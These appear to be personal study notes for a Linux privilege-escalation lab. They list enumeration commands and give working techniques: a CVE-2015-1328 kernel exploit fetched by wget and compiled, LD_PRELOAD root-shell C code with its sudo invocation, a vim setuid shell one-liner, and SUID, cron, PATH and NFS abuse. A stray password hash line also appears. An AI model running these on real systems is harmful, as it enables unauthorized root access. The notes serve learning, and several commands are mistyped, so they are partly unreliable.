# What Is Privilege Escalation 
 - ### .going from a lower permission account to a higher permission one
 - ### .exploitation of a vulnerability, design flaw or configuration oversight in an OS or APP to gain unathorized access to resources that are usually restricted from the users

## Privilege Escalation allows:
1. Resetting passwords
2. Bypass access controls to compromise protected data
3. Editing software configurations
4. Enabling persistence
5. Changing the privilege of existing users
6. Execute any admin command

## Enumeration - first step taken after gaining access, important step post-compromise phase

<h1 align="center">Linux Commands </h1>

- 'hostname' - command returns hostname of the target machine
- 'uname -a' - print system information detail about kernel, useful for potential kernel vulns
- '/proc/version' - info about the target system processes
- '/etc/issue' - file contains info about the OS, can be eaily customized or changed
- 'ps' - see running processes on linux system:
1. PID: Process ID
2. TTY: Terminal type used by user
3. Time: Amount of CPU time used by process
4. CMD: command or executable running
### 'ps -a': view all running processes
### 'ps axjf': view process tree
### 'ps aux': will show processes for all users
### -a: all users
### -u: display the user that launced the process
### -x: show processes that are not attached to a terminal

### 'env': show environmental variables
### 'sudo -l: list all commands the user can run using 'sudo'
### 'ls': list files in current directory
### 'ls -la': list all files including hidden files in current directory
### 'id <user>': provide a general overview of the user's privilege level
### 'cat /etc/passwd': discover users on the system
### 'cat /etc/passwd | cut -d ":" -f 1": easily list all users and ignore other parts
### 'history': look at earlier commands 
### 'ifconfig': information about the network interfaces (eth0, tun0, and tun1)
### 'ip route': see network route

### 'netstat': gather information on existing connections
### 'netstat -a': shows all listening ports and established connections
### 'netstat -at': list TCP protocols
### 'netstat -au': list UDP protocols
### 'netstat -l': list ports in 'listening' mode. Ports are open and ready to accept incoming connection
### 'netstat -lt': list ports in 'listening' mode using TCP protocol
### 'netstat -s': list network usage statistics by protocol (-t: TCP, -u: UDP)
### 'netstat -tp': list connections with service name and PID (-l: listening ports)
### 'netstat -i': shows interface stats
### 'netstat -ano': -a = display all sockets, -n: do not resolve names, -o: display timers

### find command - searching the target system for important information and potential privilege escalation vectors 
### 'find . -name <filename>.txt' find the file named <filename> in the current directory
### 'find /home -name <filename>.txt': find file named <filename> in the /home directory
### 'find / -type d -name config': find the directory named config under "/"
### 'find / -type f -perm 0777': find files with the 777 permissions(files readable, writable and executable by all users)
### 'find / -perm a=x':find executable files
### 'find /home -user frank': find all files for user "frank" under "/home"
### 'find / -mtime 10': find files modified in the last 10 days
### 'find / -atime 10': find files accessed in the last 10 days
### 'find / -cmin -60': find files changed in the last hour 
### 'find / -amin -60': find files accessed in the last hour
### 'find / -size 50M': find files with a 50 MB size

### folders and files that can be written to or executed from:
#### 1. 'find / -writable -type d 2>/dev/null'
#### 2. 'find / -perm -222 -type d 2>/dev/null'
#### 3. 'find / -perm -o w -type d 2>/dev/null'
### 'find / -perm -o x -type d 2>/dev/null': find world executable folders
### find development tools and supported languages:
#### 'find / -name perl*'
#### 'find / -name python*'
#### 'find / -name gcc*'
### 'find / -perm -u=s -type f 2>/dev/null': find files with SUID bit, which allows us to run the file with a higher privilege than the current user

### Automated Enumeration Tools - linux enumeration tools with Github Repositories
#### LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
#### LinEnum: https://github.com/rebootuser/LinEnum
#### LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
#### Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
#### Linux Priv Checker: https://github.com/linted/linuxprivchecker

## Kernel Exploits
### -privEsc ideally leads to root privileges
### -achieved by exploting an existing vuln or accessing another user account that has higher privileges
### -rely on misconfigurations and lax permissions
### -methodology:
#### 1. Id the Kernel version
#### 2. search and find an exploit code (https://www.linuxkernelcves.com/cves)
#### 3. Run the exploit

### Linux Kernel 3.13.0-24-generic x86 64
#### CVE-2015-1328: Allows local users to obtain root access by leveraging a configuration in which 'overlayfs' is permitted in an arbitrary mount namespace. 
#### Exploit: https://www.exploit-db.com/exploits/37292
#### 1. Need to copy exploit file to the target machine
##### a. start a python server to serve the file
##### python3 -m http.server 8888
##### b. on target machine copy the file in the /tmp folder
##### wget http://1.2.3.4/8888/exploit.c
#### 2. compile the exploit
##### gcc exploit.c -o pwned
#### 3. search for flag
##### find . -name flag1.txt
#### 4. cat flag1.txt

### Sudo
#### -check root privileges using 'sudo -l'
#### -Leverage application functions: some application allow the loading of alternative configuration files
#### eg: Apache2 ('-f': specify an alternate ServerConfigFile)
#### -Leverage LD_PRELOAD: allows any program to use shared libraries
#### -if "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run
#### -LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID
### -Methodology:
#### 1. Check for LD_PRELOAD(with the env_keep option enabled)
#### 2. Write a simple C code compiled as a share object (.so extension) file
#### 3. Run the program with sudo rights and LD_PRELOAD option pointing to our .so file
### The C code will simply spawn a root shell and can be written as follows; shell.c

#include <stdio.h>'
#include <sys/types.h>'
#include <stdlib.h>'

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}

#### gcc -fPIC -shared -o shell.so shell.c -nostartfiles
#### -use this shared object file when launching any program the user can run with sudo
#### sudo LD_PRELOAD=/home/user/ldpreload/shell.so find

#### $6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1:18796:0:99999:7:::

### SUID
#### -Linux privilege controls rely on controlling users and file interacions
#### -achieved using permissions
#### -SUID(set-user identification)
#### -SGID(set-group identification)
#### -'s'bit - special permission level
#### 'find / -type f -perm -04000 -ls 2>/dev/null': list files with SUID or SGID bit set

### Capabilities
#### 'getcap' tool  to list enabled capabilities
#### -capabilites help manage privileges at a more granular level
#### 'getcap -r /' generates a lot of erros so it is good practice to redirect error messages to /dev/null
#### 'getcap -r / 2>/dev/null'
### vim:
#### ./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

### Cron Jobs
#### -used to run scripts or binaries at specific times
#### -run with privilege of the owner and not current user
#### -task that runs on root privileges, change script that will be run to new script with root privileges
#### -stored as crontabs
#### -any user can read the file keeping system-wide cron jobs under '/etc/crontab'
#### backup.sh - configured to run every minute

### PATH
#### -if a folder for the user has a write permission located in the path, an applicaition in the path could be hijacked to run a script and increase privileges
#### echo $PATH

### NFS
#### -Network file sharing: configuration is kept in '/etc/exports' file. 
#### -the file is created during the NFS server installation and can usually be read by users
#### -critical element: "no_root_squash" - default NFS will change the root user to nfsnobody and strip any file from operating with root privileges
#### - 'no_root_squash' is present on a writable share, it is possible to create an executable with SUID bit set and run it on the target system




